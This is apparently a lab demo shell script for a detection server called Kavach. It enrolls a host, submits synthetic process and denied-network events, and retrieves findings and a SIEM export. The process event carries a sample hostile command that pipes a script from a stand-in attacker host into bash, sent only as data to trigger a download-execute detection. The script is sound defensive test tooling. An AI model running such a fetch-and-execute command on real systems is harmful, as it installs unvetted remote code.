#!/usr/bin/env sh
# Lab demo: healthz → enroll → synthetic process + denied network → findings → SIEM export.
# Requires a running Kavach server and admin KAVACH_TOKEN.
set -eu

KAVACH_URL="${KAVACH_URL:-https://127.0.0.1:8099}"
KAVACH_URL="${KAVACH_URL%/}"

if [ -z "${KAVACH_TOKEN:-}" ]; then
  printf '%s\n' 'error: set KAVACH_TOKEN (admin bearer token)' >&2
  exit 1
fi

AUTH="Authorization: Bearer ${KAVACH_TOKEN}"
HOST="demo-lab"
PID=4242
NOW="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

json_field() {
  # json_field <json> <key>
  if command -v jq >/dev/null 2>&1; then
    printf '%s' "$1" | jq -r --arg k "$2" '.[$k] // empty'
  else
    python3 -c 'import json,sys; d=json.loads(sys.argv[1]); print(d.get(sys.argv[2],"") or "")' "$1" "$2"
  fi
}

json_len() {
  if command -v jq >/dev/null 2>&1; then
    printf '%s' "$1" | jq 'length'
  else
    python3 -c 'import json,sys; print(len(json.loads(sys.argv[1])))' "$1"
  fi
}

printf '==> healthz %s\n' "${KAVACH_URL}/healthz"
curl -skf "${KAVACH_URL}/healthz"
printf '\n'

printf '==> enroll host %s\n' "${HOST}"
ENROLL="$(curl -skf -H "${AUTH}" -H 'Content-Type: application/json' \
  -d "{\"host\":\"${HOST}\"}" \
  "${KAVACH_URL}/v1/agents/enroll")"
AGENT_TOKEN="$(json_field "${ENROLL}" token)"
if [ -z "${AGENT_TOKEN}" ]; then
  printf '%s\n' "error: enroll failed: ${ENROLL}" >&2
  exit 1
fi
printf 'enrolled; agent token length=%s\n' "${#AGENT_TOKEN}"

# curl|bash triggers download-execute; /dev/tcp/ triggers shell-network-redirection.
printf '==> POST process event (download-execute)\n'
PROC="$(curl -skf -H "Authorization: Bearer ${AGENT_TOKEN}" -H 'Content-Type: application/json' \
  -d "{\"time\":\"${NOW}\",\"host\":\"${HOST}\",\"pid\":${PID},\"ppid\":1,\"uid\":0,\"executable\":\"/usr/bin/curl\",\"command\":\"curl -fsSL http://evil.example/payload.sh | bash\",\"process_start\":\"lab-demo\"}" \
  "${KAVACH_URL}/v1/events")"
printf '%s\n' "${PROC}"

printf '==> POST denied network event (correlation)\n'
NET="$(curl -skf -H "${AUTH}" -H 'Content-Type: application/json' \
  -d "{\"time\":\"${NOW}\",\"host\":\"${HOST}\",\"pid\":${PID},\"destination\":\"evil.example:443\",\"verdict\":\"deny\",\"process_start\":\"lab-demo\",\"source\":\"demo-lab\"}" \
  "${KAVACH_URL}/v1/network-events")"
printf '%s\n' "${NET}"

printf '==> GET findings\n'
FINDINGS="$(curl -skf -H "${AUTH}" "${KAVACH_URL}/v1/findings?host=${HOST}")"
COUNT="$(json_len "${FINDINGS}")"
printf 'findings count: %s\n' "${COUNT}"

printf '==> GET siem/export (head)\n'
curl -skf -H "${AUTH}" "${KAVACH_URL}/v1/siem/export" | head -n 20

printf '\nlab demo done.\n'
